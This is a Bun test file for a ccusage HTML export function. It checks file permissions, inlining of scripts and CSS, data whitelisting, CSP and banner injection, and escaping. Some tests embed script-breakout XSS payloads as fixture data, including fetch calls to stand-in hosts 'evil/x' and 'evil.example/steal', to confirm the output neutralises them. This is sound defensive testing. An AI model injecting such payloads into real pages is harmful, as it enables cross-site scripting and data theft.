import { describe, expect, test } from "bun:test";
import { mkdirSync, mkdtempSync, rmSync, statSync, chmodSync, writeFileSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import type { UsageData } from "./types";
import { buildExportedHtml, exportOutputPath, writeExportedHtml } from "./export";

const HTML = [
  "<!doctype html><html><head><title>ccusage</title>",
  '<link rel="stylesheet" href="/public/app.css" />',
  "</head><body>",
  '<script src="/public/vendor/chart.umd.min.js"></script>',
  '<script id="embedded-data"></script>',
  '<script src="/dist/bundle.js"></script>',
  "</body></html>",
].join("\n");

const DATA: UsageData = {
  daily: [
    {
      period: "2026-08-11",
      totalCost: 1.5,
      totalTokens: 100,
      inputTokens: 60,
      outputTokens: 40,
      cacheReadTokens: 0,
      cacheCreationTokens: 0,
      modelsUsed: ["claude"],
      modelBreakdowns: [],
      agents: [],
    },
  ],
  monthly: [],
};

function build(): string {
  return buildExportedHtml(HTML, "var CHART = 1;", "var BUNDLE = 2;", "body { color: #000; }", DATA);
}

function embeddedScriptContent(out: string): string {
  const match = out.match(/<script id="embedded-data">(.*?)<\/script>/s);
  expect(match).not.toBeNull();
  return match![1]!;
}

function extractEmbeddedJson(out: string): string {
  const assignment = embeddedScriptContent(out);
  expect(assignment).toMatch(/^window\.CCUSAGE_DATA = /);
  return assignment.replace(/^window\.CCUSAGE_DATA = /, "").replace(/;$/, "");
}

describe("exportOutputPath", () => {
  test("出力先は実行時カレントの dist/ccusage-ledger.html", () => {
    expect(exportOutputPath("/tmp/work")).toBe(join("/tmp/work", "dist", "ccusage-ledger.html"));
  });
});

describe("writeExportedHtml", () => {
  test("出力ファイルのパーミッションを 0600 にする", () => {
    const dir = mkdtempSync(join(tmpdir(), "ccusage-export-"));
    const out = join(dir, "dist", "ccusage-ledger.html");
    writeExportedHtml(out, "<html>test</html>");
    const mode = statSync(out).mode & 0o777;
    expect(mode).toBe(0o600);
    rmSync(dir, { recursive: true, force: true });
  });

  test("既存ファイルが 0644 でも上書き時に 0600 へ戻す（mode は作成時のみ適用されるため）", () => {
    const dir = mkdtempSync(join(tmpdir(), "ccusage-export-"));
    const out = join(dir, "dist", "ccusage-ledger.html");
    mkdirSync(dirname(out), { recursive: true });
    writeFileSync(out, "<html>old</html>", { mode: 0o644 });
    chmodSync(out, 0o644);
    writeExportedHtml(out, "<html>new</html>");
    expect(statSync(out).mode & 0o777).toBe(0o600);
    expect(readFileSync(out, "utf-8")).toBe("<html>new</html>");
    rmSync(dir, { recursive: true, force: true });
  });
});

describe("buildExportedHtml", () => {
  test("Chart.js の script タグをインライン内容に置換する", () => {
    const out = build();
    expect(out).toContain("<script>var CHART = 1;</script>");
    expect(out).not.toContain('<script src="/public/vendor/chart.umd.min.js"></script>');
  });

  test("bundle の script タグをインライン内容に置換する", () => {
    const out = build();
    expect(out).toContain("<script>var BUNDLE = 2;</script>");
    expect(out).not.toContain('<script src="/dist/bundle.js"></script>');
  });

  test("app.css の link タグをインラインの <style> に置換する", () => {
    const out = build();
    expect(out).toContain("<style>body { color: #000; }</style>");
    expect(out).not.toContain('<link rel="stylesheet" href="/public/app.css" />');
  });

  test("データを window.CCUSAGE_DATA に JSON として埋め込む", () => {
    const out = build();
    const json = extractEmbeddedJson(out);
    expect(JSON.parse(json)).toEqual(DATA);
  });

  test("埋め込むデータは白リスト投影を通す（未知フィールドを配布しない）", () => {
    const data = {
      ...DATA,
      daily: [{ ...DATA.daily![0]!, promptText: "sensitive session text", unknownField: { nested: 1 } }],
    };
    const out = buildExportedHtml(HTML, "chart", "bundle", "css", data as unknown as typeof DATA);
    const embedded = JSON.parse(extractEmbeddedJson(out)) as Record<string, unknown>;
    const entry = (embedded.daily as Record<string, unknown>[])[0]!;
    expect(entry.promptText).toBeUndefined();
    expect(entry.unknownField).toBeUndefined();
  });

  test("データに </script> を含む文字列があっても script を破壊しない", () => {
    const data: UsageData = {
      ...DATA,
      daily: [
        {
          ...DATA.daily![0]!,
          modelsUsed: ['claude-3</script><script>alert("x")'],
        },
      ],
    };
    const out = buildExportedHtml(HTML, "chart", "bundle", "css", data);
    expect(embeddedScriptContent(out)).not.toContain("</script>");
    expect(JSON.parse(extractEmbeddedJson(out))).toEqual(data);
  });

  test("データに script 終了タグが複数あっても埋め込みにリテラルの < を残さない", () => {
    const data: UsageData = {
      ...DATA,
      daily: [
        {
          ...DATA.daily![0]!,
          modelBreakdowns: [
            {
              modelName: '</script><script>fetch("//evil/x")</script><img src=x onerror=alert(1)>',
              cost: 1,
              inputTokens: 1,
              outputTokens: 1,
              cacheReadTokens: 0,
              cacheCreationTokens: 0,
            },
          ],
        },
      ],
    };
    const out = buildExportedHtml(HTML, "chart", "bundle", "css", data);
    expect(embeddedScriptContent(out)).not.toContain("<");
    expect(JSON.parse(extractEmbeddedJson(out))).toEqual(data);
  });

  test("敵対的なデータでも、エクスポート HTML 全体に生の </script> ペイロードを含めない", () => {
    const payload = '</script><script>fetch("https://evil.example/steal")</script>';
    const data: UsageData = {
      ...DATA,
      daily: [
        {
          ...DATA.daily![0]!,
          modelBreakdowns: [
            {
              modelName: payload,
              cost: 1,
              inputTokens: 1,
              outputTokens: 1,
              cacheReadTokens: 0,
              cacheCreationTokens: 0,
            },
          ],
        },
      ],
    };
    const out = buildExportedHtml(HTML, "chart", "bundle", "css", data);
    // 生のペイロード断片が出力のどこにも現れない（エスケープ + \u003c 変換で実効化されない）
    expect(out).not.toContain(payload);
    // embedded-data スクリプト内にリテラルの < を残さない
    expect(embeddedScriptContent(out)).not.toContain("<");
  });

  test("データに U+2028 / U+2029 が含まれても埋め込みに生バイトを残さない（旧 JS エンジンで script が壊れない）", () => {
    const data: UsageData = {
      ...DATA,
      daily: [
        {
          ...DATA.daily![0]!,
          modelsUsed: ["claude\u2028-4", "gpt\u2029-5"],
        },
      ],
    };
    const out = buildExportedHtml(HTML, "chart", "bundle", "css", data);
    expect(embeddedScriptContent(out)).not.toContain("\u2028");
    expect(embeddedScriptContent(out)).not.toContain("\u2029");
    expect(JSON.parse(extractEmbeddedJson(out))).toEqual(data);
  });

  test("エクスポート HTML に CSP を注入する（ネットワーク送信を遮断）", () => {
    const out = build();
    expect(out).toContain('<meta http-equiv="Content-Security-Policy"');
    expect(out).toContain("connect-src 'none'");
    expect(out).toContain("script-src 'unsafe-inline'");
    expect(out).toContain("frame-ancestors 'none'");
  });

  test("エクスポート HTML にデータ取り扱いの警告バナーを注入する（英語デフォルト + data-i18n キー）", () => {
    const out = build();
    expect(out).toContain("This file contains your ccusage usage data");
    expect(out).toContain('data-i18n="exportWarning"');
  });

  test("エクスポート HTML にフレーム検出スクリプトを注入する（clickjacking 対策）", () => {
    const out = build();
    expect(out).toContain("window.top !== window.self");
  });

  test("</head> が無い HTML では例外を投げる（CSP 注入が静かに失われない）", () => {
    expect(() => buildExportedHtml("<html><body></body></html>", "chart", "bundle", "css", DATA)).toThrow();
  });

  test("<body> が無い HTML では例外を投げる（バナー注入が静かに失われない）", () => {
    expect(() => buildExportedHtml("<html><head></head></html>", "chart", "bundle", "css", DATA)).toThrow();
  });

  test("Chart.js / bundle / 埋め込みデータ / app.css のタグが無い HTML では例外を投げる（replace 漏れを検出）", () => {
    const withoutChart = HTML.replace('<script src="/public/vendor/chart.umd.min.js"></script>', "");
    expect(() => buildExportedHtml(withoutChart, "chart", "bundle", "css", DATA)).toThrow(/chart/i);

    const withoutBundle = HTML.replace('<script src="/dist/bundle.js"></script>', "");
    expect(() => buildExportedHtml(withoutBundle, "chart", "bundle", "css", DATA)).toThrow(/bundle/i);

    const withoutEmbedded = HTML.replace('<script id="embedded-data"></script>', "");
    expect(() => buildExportedHtml(withoutEmbedded, "chart", "bundle", "css", DATA)).toThrow(/embedded data/i);

    const withoutCss = HTML.replace('<link rel="stylesheet" href="/public/app.css" />', "");
    expect(() => buildExportedHtml(withoutCss, "chart", "bundle", "css", DATA)).toThrow(/app\.css/i);
  });
});
